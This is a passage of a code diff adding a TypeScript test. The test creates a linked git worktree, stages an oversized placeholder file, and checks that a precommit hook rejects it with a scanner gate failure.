+    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'commander-precommit-policy-'));
+    const primary = process.cwd();
+    const linked = path.join(tempRoot, 'linked');
+    const fixture = path.join('.commander', 'oversized-policy-fixture.ts');
+
+    const git = (cwd: string, args: string[]) =>
+      execFileSync('git', args, { cwd, encoding: 'utf8' });
+    const runHook = () =>
+      execFileSync(
+        process.execPath,
+        ['--import', 'tsx', path.join(primary, 'scripts', 'precommitHook.ts')],
+        {
+          cwd: linked,
+          encoding: 'utf8',
+          stdio: 'pipe',
+        },
+      );
+    const linkDependencies = () => {
+      const links = [
+        ['node_modules', 'node_modules'],
+        [
+          path.join('packages', 'core', 'node_modules'),
+          path.join('packages', 'core', 'node_modules'),
+        ],
+      ];
+      for (const [target, source] of links) {
+        const destination = path.join(linked, target);
+        fs.mkdirSync(path.dirname(destination), { recursive: true });
+        fs.symlinkSync(
+          path.join(primary, source),
+          destination,
+          process.platform === 'win32' ? 'junction' : 'dir',
+        );
+      }
+    };
+
+    try {
+      git(primary, ['worktree', 'add', '--detach', linked]);
+      linkDependencies();
+      fs.mkdirSync(path.join(linked, '.commander'), { recursive: true });
+      fs.writeFileSync(path.join(linked, fixture), 'x'.repeat(500 * 1024 + 1));
+      git(linked, ['add', fixture]);
 
       assert.throws(runHook, /precommit scanner gate failed/);
     } finally {
